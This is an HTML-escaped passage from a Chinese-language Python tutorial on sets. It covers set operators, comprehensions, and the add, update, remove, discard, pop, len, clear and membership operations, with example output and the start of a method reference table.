&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;a &lt;span class=&#34;token operator&#34;&gt;^&lt;/span&gt; b&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;  &lt;span class=&#34;token comment&#34;&gt;# a 和 b 中不同时存在的元素&lt;/span&gt;

&lt;span class=&#34;token triple-quoted-string string&#34;&gt;&#39;&#39;&#39;
{1, &#39;123&#39;, &#39;test&#39;}
test 在集合中
{&#39;a&#39;, &#39;b&#39;, &#39;r&#39;, &#39;c&#39;, &#39;d&#39;}
{&#39;b&#39;, &#39;d&#39;, &#39;r&#39;}
{&#39;a&#39;, &#39;m&#39;, &#39;r&#39;, &#39;b&#39;, &#39;c&#39;, &#39;d&#39;, &#39;l&#39;, &#39;z&#39;}
{&#39;c&#39;, &#39;a&#39;}
{&#39;d&#39;, &#39;l&#39;, &#39;r&#39;, &#39;m&#39;, &#39;z&#39;, &#39;b&#39;}
&#39;&#39;&#39;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;推导式&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-python&#34; data-language=&#34;python&#34;&gt;&lt;code class=&#34;language-python&#34;&gt;a &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;{&lt;/span&gt;x &lt;span class=&#34;token keyword&#34;&gt;for&lt;/span&gt; x &lt;span class=&#34;token keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;abracadabra&#39;&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt; x &lt;span class=&#34;token keyword&#34;&gt;not&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;abc&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;}&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;a&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;

&lt;span class=&#34;token comment&#34;&gt;# {&#39;r&#39;, &#39;d&#39;}&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;基本操作&#34;&gt;&lt;a href=&#34;#基本操作&#34; class=&#34;headerlink&#34; title=&#34;基本操作&#34;&gt;&lt;/a&gt;基本操作&lt;/h3&gt;&lt;h4 id=&#34;添加元素&#34;&gt;&lt;a href=&#34;#添加元素&#34; class=&#34;headerlink&#34; title=&#34;添加元素&#34;&gt;&lt;/a&gt;添加元素&lt;/h4&gt;&lt;pre class=&#34;line-numbers language-python&#34; data-language=&#34;python&#34;&gt;&lt;code class=&#34;language-python&#34;&gt;s&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;add&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt; x &lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;pre class=&#34;line-numbers language-python&#34; data-language=&#34;python&#34;&gt;&lt;code class=&#34;language-python&#34;&gt;thisset &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;set&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;Google&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;Runoob&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;Taobao&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;thisset&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
thisset&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;add&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;test&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;thisset&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;

&lt;span class=&#34;token triple-quoted-string string&#34;&gt;&#39;&#39;&#39;
{&#39;Taobao&#39;, &#39;Google&#39;, &#39;Runoob&#39;}
{&#39;Taobao&#39;, &#39;test&#39;, &#39;Google&#39;, &#39;Runoob&#39;}
&#39;&#39;&#39;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;s.update( x )参数可以是列表，元组，字典&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-python&#34; data-language=&#34;python&#34;&gt;&lt;code class=&#34;language-python&#34;&gt;s&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;update&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt; x &lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;pre class=&#34;line-numbers language-python&#34; data-language=&#34;python&#34;&gt;&lt;code class=&#34;language-python&#34;&gt;thisset &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;set&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;Google&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;Runoob&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;Taobao&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
thisset&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;update&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;thisset&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
thisset&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;update&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;4&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;5&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;6&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;thisset&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;

&lt;span class=&#34;token triple-quoted-string string&#34;&gt;&#39;&#39;&#39;
{1, 3, &#39;Google&#39;, &#39;Taobao&#39;, &#39;Runoob&#39;}
{1, 3, 4, &#39;Google&#39;, 5, 6, &#39;Taobao&#39;, &#39;Runoob&#39;}
&#39;&#39;&#39;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h4 id=&#34;移除元素&#34;&gt;&lt;a href=&#34;#移除元素&#34; class=&#34;headerlink&#34; title=&#34;移除元素&#34;&gt;&lt;/a&gt;移除元素&lt;/h4&gt;&lt;pre class=&#34;line-numbers language-python&#34; data-language=&#34;python&#34;&gt;&lt;code class=&#34;language-python&#34;&gt;s&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;remove&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt; x &lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;

thisset &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;set&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;Google&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;Runoob&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;Taobao&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;thisset&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
thisset&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;remove&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;Taobao&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;thisset&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;

&lt;span class=&#34;token triple-quoted-string string&#34;&gt;&#39;&#39;&#39;
{&#39;Google&#39;, &#39;Taobao&#39;, &#39;Runoob&#39;}
{&#39;Google&#39;, &#39;Runoob&#39;}
&#39;&#39;&#39;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;pre class=&#34;line-numbers language-python&#34; data-language=&#34;python&#34;&gt;&lt;code class=&#34;language-python&#34;&gt;s&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;discard&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt; x &lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;

thisset &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;set&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;Google&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;Runoob&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;Taobao&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;thisset&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
thisset&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;discard&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;Facebook&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;  &lt;span class=&#34;token comment&#34;&gt;# 不存在不会发生错误&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;thisset&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;

&lt;span class=&#34;token triple-quoted-string string&#34;&gt;&#39;&#39;&#39;
{&#39;Google&#39;, &#39;Taobao&#39;, &#39;Runoob&#39;}
{&#39;Google&#39;, &#39;Taobao&#39;, &#39;Runoob&#39;}
&#39;&#39;&#39;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;设置随机删除集合中的一个元素&lt;/p&gt;
&lt;p&gt;pop 方法会对集合进行无序的排列&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-python&#34; data-language=&#34;python&#34;&gt;&lt;code class=&#34;language-python&#34;&gt;s&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;pop&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; 

thisset &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;set&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;Google&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;Runoob&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;Taobao&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;Facebook&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
x &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; thisset&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;pop&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;

&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;x&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;

&lt;span class=&#34;token triple-quoted-string string&#34;&gt;&#39;&#39;&#39;
Facebook
&#39;&#39;&#39;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h4 id=&#34;计算集合元素个数&#34;&gt;&lt;a href=&#34;#计算集合元素个数&#34; class=&#34;headerlink&#34; title=&#34;计算集合元素个数&#34;&gt;&lt;/a&gt;计算集合元素个数&lt;/h4&gt;&lt;pre class=&#34;line-numbers language-python&#34; data-language=&#34;python&#34;&gt;&lt;code class=&#34;language-python&#34;&gt;&lt;span class=&#34;token builtin&#34;&gt;len&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;s&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;

thisset &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;set&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;Google&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;Runoob&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;Taobao&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;len&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;thisset&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;

&lt;span class=&#34;token comment&#34;&gt;# 3&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h4 id=&#34;清空集合&#34;&gt;&lt;a href=&#34;#清空集合&#34; class=&#34;headerlink&#34; title=&#34;清空集合&#34;&gt;&lt;/a&gt;清空集合&lt;/h4&gt;&lt;pre class=&#34;line-numbers language-python&#34; data-language=&#34;python&#34;&gt;&lt;code class=&#34;language-python&#34;&gt;s&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;clear&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;

thisset &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;set&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;Google&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;Runoob&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;Taobao&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
thisset&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;clear&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;thisset&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;

&lt;span class=&#34;token comment&#34;&gt;# set()&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h4 id=&#34;判断元素是否在集合中存在&#34;&gt;&lt;a href=&#34;#判断元素是否在集合中存在&#34; class=&#34;headerlink&#34; title=&#34;判断元素是否在集合中存在&#34;&gt;&lt;/a&gt;判断元素是否在集合中存在&lt;/h4&gt;&lt;pre class=&#34;line-numbers language-python&#34; data-language=&#34;python&#34;&gt;&lt;code class=&#34;language-python&#34;&gt;x &lt;span class=&#34;token keyword&#34;&gt;in&lt;/span&gt; s

thisset &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;set&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;Google&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;Runoob&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;Taobao&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;Runoob&#34;&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;in&lt;/span&gt; thisset&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;Facebook&#34;&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;in&lt;/span&gt; thisset&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;

&lt;span class=&#34;token triple-quoted-string string&#34;&gt;&#39;&#39;&#39;
True
False
&#39;&#39;&#39;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;判断元素 x 是否在集合 s 中，存在返回 True，不存在返回 False&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th align=&#34;left&#34;&gt;方法&lt;/th&gt;
&lt;th align=&#34;left&#34;&gt;描述&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;&lt;a href=&#34;https://www.runoob.com/python3/ref-set-add.html&#34;&gt;add()&lt;/a&gt;&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;为集合添加元素&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;&lt;a href=&#34;https://www.runoob.com/python3/ref-set-clear.html&#34;&gt;clear()&lt;/a&gt;&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;移除集合中的所有元素&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;&lt;a href=&#34;https://www.runoob.com/python3/ref-set-copy.html&#34;&gt;copy()&lt;/a&gt;&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;拷贝一个集合&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;&lt;a href=&#34;https://www.runoob.com/python3/ref-set-difference.html&#34;&gt;difference()&lt;/a&gt;&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;返回多个集合的差集&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;&lt;a href=&#34;https://www.runoob.com/python3/ref-set-difference_update.html&#34;&gt;difference_update()&lt;/a&gt;&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;移除集合中的元素，该元素在指定的集合也存在。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;&lt;a href=&#34;https://www.runoob.com/python3/ref-set-discard.html&#34;&gt;discard()&lt;/a&gt;&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;删除集合中指定的元素&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;&lt;a href=&#34;https://www.runoob.com/python3/ref-set-intersection.html&#34;&gt;intersection()&lt;/a&gt;&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;返回集合的交集&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;&lt;a href=&#34;https://www.runoob.com/python3/ref-set-intersection_update.html&#34;&gt;intersection_update()&lt;/a&gt;&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;返回集合的交集。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
